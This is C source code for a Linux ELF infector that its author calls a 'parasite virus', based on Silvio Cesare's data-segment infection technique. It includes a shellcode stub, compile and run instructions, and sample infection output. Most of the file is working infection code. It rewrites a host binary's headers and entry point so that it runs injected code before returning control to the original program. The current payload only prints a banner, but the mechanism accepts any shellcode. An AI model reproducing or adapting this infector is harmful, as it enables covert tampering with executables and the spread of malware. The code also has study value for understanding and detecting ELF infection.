/*#########################################################################################################
 * ##############################################
 * ############## www.cyneox.tk #################
 * ##############################################
 * 
 * This is the source code of a very simple parasite virus , who infects data .data segment 
 * of a host file.During this process the section header (SHDR) and the sections offsets will be changed.
 * This source bases on Silvio Cesares code (data_infect.c) and I will like to thank him for writting such 
 * good tutorials and code sources.You'll see a lot of comments in this code and I hope you'll understand 
 * these "lines of letters".
 * 
 * BEST REGARDS TO : Silvio Cesare ( thanks dude for this wonderfull code )
 *                 : Zenok         ( thanks for your moral support ...)
 *                 : $all vxers ,who code good viruses...
 * 
 * That's all folks : xor eax,eax
 *                    inc eax
 *                    int 0x80
 * 
 * mail me : cyneox@cyneox.tk
 * 
 * [code]
 * linux:~# date
 * Mon Apr 12 14:54:35 CEST 2004
 * [/code]
 * ########################################################################################################*/


/* how to compile : 
 * [code]
 * linux:~# gcc -o LinDataSeg_Virus LinDataSeg_Virus.c
 * [/code]
 * 
 * example of execution:
 * [code]
 * linux:~# ./prog
 * Your Integer : 1 
 * Your second integer : 2
 *  --->outputs<---
 *  first integer= 1
 *  second integer= 2
 *  The sum of the integers: 3
 *
 * linux:~# ./LinDataSeg prog
 * PT_LOAD(.data) segment : 
 * > p_vaddr  = 0x8049954
 * > p_filesz = 808
 * > p_memsz  = 840
 * > p_offset = 2388
 * > (new) p_filsz = 909
 * > (new) p_memsz = 941
 * > (new) e_entry = 0x8049c9c
 * > (new) e_shoff = 12277
 * > (new) e_phoff = 52
 *
 * Infecting host file at offset = 3196
 * > host file size : 17161
 * > virus size : 69
 * > bss_len : 32
 *
 * Yeah baby ...time for action ! --> copying virus to host file at offset : 3196
 * <-#-> renaming :      [ done ]
 * <-#-> infection :     [ done ]
 *
 * linux:~# ./prog
 * ---> www.cyneox.tk <---
 * Your Integer : 1
 * Your second integer : 2
 * --->outputs<---
 * first integer= 1
 * second integer= 2
 * The sum of the integers: 3
 *
 *[/code]
 */

#include <stdio.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>
#include <errno.h>
#include <elf.h>

extern int errno;


#define ERROR(x) { fprintf(stderr,"__error__("#x") : %s\n",strerror(errno)); exit(EXIT_FAILURE);}
void prepare_file(char *,char *,int,int);
void infect_me_baby(char *,int,char*,int,int,int);


/*############################### MAIN ####################################*/
main(int argc,char **argv)
{
	int off=33;
	char asm_code[]= "\x57"         /* push edi */
		"\x56"                  /* push esi */
		"\x50"                  /* push eax */
		"\x53"                  /* push ebx */
		"\x51"                  /* push ecx */
		"\x52"                  /* push edx *7*/
		"\xeb\x1f"              /* jmp msg_jump */
/* msg_call:*/	"\x59"                  /* pop ecx */
		"\xb8\x04\x00\x00\x00"  /* mov eax,4 */
		"\xbb\x01\x00\x00\x00"  /* mov ebx,1 */
		"\xba\x18\x00\x00\x00"  /* mov edx,18 */
		"\xcd\x80"              /* int 0x80 */
		"\x5a"                  /* pop edx */
		"\x59"                  /* pop ecx */
		"\x5b"                  /* pop ebx */
		"\x58"                  /* pop eax */
		"\x5e"                  /* pop esi */
		"\x5f"                  /* pop edi */
		"\xbd\x00\x00\x00\x00"  /* mov ebp,0 */
		"\xff\xe5"              /* jmp ebp 
/* msg_jump:*/	"\xe8\xdc\xff\xff\xff" /* call msg_call */
		"---> www.cyneox.tk <---\n";
	
	
	if(argc!=2) {
		fprintf(stderr,"usage:%s file_to_infect\n",argv[0]);
		return 0;
	}
	
	prepare_file(argv[1],asm_code,sizeof(asm_code),off);
	
	return 0;
}


/*########################### PREPARE_FILE ###################################*/
void prepare_file(char *file,char *asm_code,int len,int offset)
{
	Elf32_Ehdr ehdr;
	Elf32_Shdr *shdr;
	Elf32_Phdr *phdr;
	char *data,*secdata;
	int fd,i,move=0,vir_offset,bss_len;
	
/* open host file ... */
	if((fd=open(file,O_RDWR))==-1) ERROR(prepare_file());
       
/* read the ELF header (ehdr)... */
	if(read(fd,&ehdr,sizeof(ehdr))<0) ERROR(prepare_file());
	
/* modify virus code so that it knows the correct reentry point after infection... */
	*(int*)&asm_code[offset]=ehdr.e_entry;
	
/* allocate memory for the prgram header(phdr) table */
	if((data=(char *)malloc(sizeof(*phdr)*ehdr.e_phnum))==NULL) ERROR(prepare_file());
	
/* reading the phdr table...*/
	if(lseek(fd,ehdr.e_phoff,SEEK_SET)<0) ERROR(prepare_file());
	if(read(fd,data,sizeof(*phdr)*ehdr.e_phnum)<0) ERROR(prepare_file());
	
	phdr=(Elf32_Phdr*)data;
	
/* loop through phdr and search for PT_LOAD (.data) */
	for(i=0;i<ehdr.e_phnum;i++)
	{
		if(phdr->p_type!=PT_DYNAMIC)
		{
			if(phdr->p_type==PT_LOAD && phdr->p_offset)
			{
                         /* we found the DATA segment */
				printf("PT_LOAD(.data) segment : \n"
				       "> p_vaddr  = 0x%x\n"               /* virtual addr pointing to first byte of DATA segment */
				       "> p_filesz = %i\n"               /* size of DATA segment in file image */
				       "> p_memsz  = %i\n"               /* size of DATA segment in memory image */
				       "> p_offset = %i\n",              /* file offset of DATA segment pointing to first byte of segment */
				       phdr->p_vaddr,phdr->p_filesz,phdr->p_memsz,phdr->p_offset);

				/* now we will set up the offset where the virus must be inserted*/
				/* the (new) entry point of host file will be set */
				/* we will find out the size of the .bss section */
				
     /*------------------------- PHDR of host file  after infection --------------------------*/
     /*          --> DATA in the file (file image) <-- 
      *       
      * +Fig.1      0 (beginning of file) 
      *             |----------------| +++++++++++++++++++++++|             
      *             |                |                        |
      *             |----------------| <- : phdr->p_offset    |+++++ vir_offset(from beginning fo file 
      *             *                *                        |                 to end of phdr->p_filesz)
      *             * phdr->p_filesz *                        |
      *             *++++++++++++++++* +++++++++++++++++++++++|
      * 
      * 
      * 
      *        --> Creating the new entry point... <--
      *       
      * +Fig.2                     0 (beginning of file)  
      *                            |---------------|
      *                            |               |
      *                            |---------------| <- : phdr->p_vaddr
      *                            *               *
      *                            * phdr->p_memsz *
      *      new entry point : ->  *+++++++++++++++*
      * ---------------------------------------------------------------------------------------*/
				
				vir_offset=phdr->p_offset+phdr->p_filesz;      /* see Fig.1 */
				ehdr.e_entry=phdr->p_memsz+phdr->p_vaddr;        /* see Fig.2 */
				bss_len=phdr->p_memsz-phdr->p_filesz;         
				
				break;
			}
		}
		++phdr;
	}
	
/* allocate memory for the section headers (SHDR) ... */
	if((secdata=(char *)malloc(sizeof(*shdr)*ehdr.e_shnum))==NULL) ERROR(prepare_file());
	
/* read the fucking shdr's... */
	if(lseek(fd,ehdr.e_shoff,SEEK_SET)<0) ERROR(prepare_file());
	if(read(fd,secdata,sizeof(*shdr)*ehdr.e_shnum)<0) ERROR(prepare_file());
	
	
/* update the fucking shdr's .. */
	
	shdr=(Elf32_Shdr*)secdata;
	for(i=0;i<ehdr.e_shnum;i++)
	{
		if(shdr->sh_offset>=vir_offset)
		{
			shdr->sh_offset+=len+bss_len;     /* len=size of our virus */
		}
		++shdr;
	}
/* the f***** shdr's have been update so they're ready to be written to disk */
	if(lseek(fd,ehdr.e_shoff,SEEK_SET)<0) ERROR(prepare_file());
	if(write(fd,secdata,sizeof(*shdr)*ehdr.e_shnum)<0) ERROR(prepare_file());
	
	free(secdata);
	
/* update the phdr's ... (to allow virus insertion) */
        phdr=(Elf32_Phdr*)data;
	for(i=0;i<ehdr.e_phnum;i++)
	{
		if(phdr->p_type!=PT_DYNAMIC)
		{
			if(move)
				{
					phdr->p_offset+=len+bss_len;
				}
			
			else if(phdr->p_type==PT_LOAD && phdr->p_offset)
			{
				phdr->p_filesz+=len+bss_len;
				phdr->p_memsz+=len+bss_len;
				printf("> (new) p_filsz = %i\n",phdr->p_filesz);
				printf("> (new) p_memsz = %i\n",phdr->p_memsz);
				
	/*---------------- THE PHDR AFTER UPDATING ---------------------*/
	/* 
	 *           --> DATA in the file image <--
	 * 
	 * +Fig.3     0 (beginning of file)
	 *            |---------------------|
	 *            |                     | 
	 *            |---------------------| <- : phdr->p_offset  -----|
	 *            *                     *                           |
	 *            *(old)phdr->p_filesz  *                           |
	 *            *+++++++++++++++++++++*                           |-->(new) phdr->p_filesz (from phdr->p_offset 
	 *            #                     #                           |                to end of (len+bss_len) )
	 *            #   len + bss_len     #                           |
	 *            ####################### --------------------------|
	 * 
	 * 
	 *          --> DATA in the memory image <--
	 * 
	 * +Fig.4     |---------------------|
	 *            |                     |
	 *            |---------------------| <- : phdr->p_vaddr -------|
	 *            *                     *                           |
	 *            * (old)phdr->p_memsz  *                           |
	 *            *+++++++++++++++++++++* <- : ehdr.e_entry         |-->(new) phdr->p_memsz(from phdr->p_vaddr to
	 *            #                     #                           |                the end of (len+bss_len)
	 *            #    len+bss_len      #                           |
	 *            ####################### --------------------------|
	 * ---------------------------------------------------------------*/
			  	
			      move=1;
			}
		}
		++phdr;
	}
	
/* update the phdr's to reflect the insertion of the virus... */
	if(lseek(fd,ehdr.e_phoff,SEEK_SET)<0) ERROR(prepare_file());
	if(write(fd,data,sizeof(*phdr)*ehdr.e_phnum)<0) ERROR(prepare_file());
	
	free(data);
	
/* updating ehdr... */
	if(ehdr.e_shoff>=vir_offset)
		ehdr.e_shoff+=len+bss_len;
	if(ehdr.e_phoff>=vir_offset)
		ehdr.e_phoff+=len+bss_len;
	printf("> (new) e_entry = %p\n",ehdr.e_entry);
	printf("> (new) e_shoff = %i\n",ehdr.e_shoff);
	printf("> (new) e_phoff = %i\n",ehdr.e_phoff);
	
	if(lseek(fd,0,SEEK_SET)<0) ERROR(prepare_file());
	if(write(fd,&ehdr,sizeof(ehdr))<0) ERROR(prepare_file());
	
/* yeah baby... lets infect some files !!! ;) */
	infect_me_baby(file,fd,asm_code,len,vir_offset,bss_len); 
}


/*#################################### INFECT_ME_BABY #################################*/
void infect_me_baby(char *file,int fd,char *asm_code,int len,int offset,int bss_len)
{
	struct stat stat;
	char *data;
        int vir_fd,i,zero=0;
	
	printf("\nInfecting host file at offset = %i\n",offset);
	if(fstat(fd,&stat)<0) ERROR(infect_me_baby());
	printf("> host file size : %i\n",stat.st_size);
	printf("> virus size : %i\n",len);
	printf("> bss_len : %i\n",bss_len);
	
	if((data=(char *)malloc(stat.st_size))==NULL) ERROR(infect_me_baby());
	if(lseek(fd,0,SEEK_SET)<0) ERROR(infect_me_baby());
	if(read(fd,data,stat.st_size)<0) ERROR(infect_me_baby());
	
/* open a temporary file ...*/
	if((vir_fd=open("cyneox.tmp",O_WRONLY | O_CREAT | O_EXCL ,stat.st_mode))<0) ERROR(infect_me_baby());
	
/* writing [offset] bytes from data to temp file ... */	
	if(write(vir_fd,data,offset)<0) ERROR(infect_me_baby());
	
	printf("\n Yeah baby ...time for action ! --> copying virus to host file at offset : %i\n",lseek(vir_fd,0,SEEK_CUR));

/* writing contains of .bss to temp file ... */	
	for(i=0;i<bss_len;i++) 
		write(vir_fd,&zero,1);
	
/* writing virus(asm code) to file ... */
	if(write(vir_fd,asm_code,len)<0) ERROR(infect_me_baby());
	
/* writing the rest of the host file to the temp file ... */
	if(write(vir_fd,data+offset,stat.st_size-offset)<0) ERROR(infect_me_baby());
	
/* rename temp file to host file name ... */
	printf("<-#-> renaming :      [ done ]");
	if(rename("cyneox.tmp",file)<0) ERROR(infect_me_baby());
	
	printf("\n<-#-> infection :     [ done ]\n");
}
